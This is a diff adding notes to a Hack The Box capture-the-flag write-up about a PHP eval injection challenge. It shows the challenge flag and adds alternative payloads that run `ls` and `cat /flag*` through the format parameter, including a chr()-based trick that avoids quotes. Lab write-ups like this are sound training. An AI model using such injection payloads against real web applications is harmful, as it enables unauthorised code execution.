@@ -52,7 +52,10 @@ The flag is therefore:
 HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
 ```
 
-After completing the challenge, another page was found which explored alternative solutions[^3].
+After completing the challenge, another page was found which explored alternative solutions[^3]. Interesting ideas:
+ - Use the backtick notation, e.g. ``?format=${print(`ls /`)}``
+ - Use a wildcard in the `cat` shell command: `cat /flag*`.
+ - Use the `chr()` function to build strings without using quotes, e.g. `?format=${system(chr(108).chr(115))}`
 
 ### Sources
 
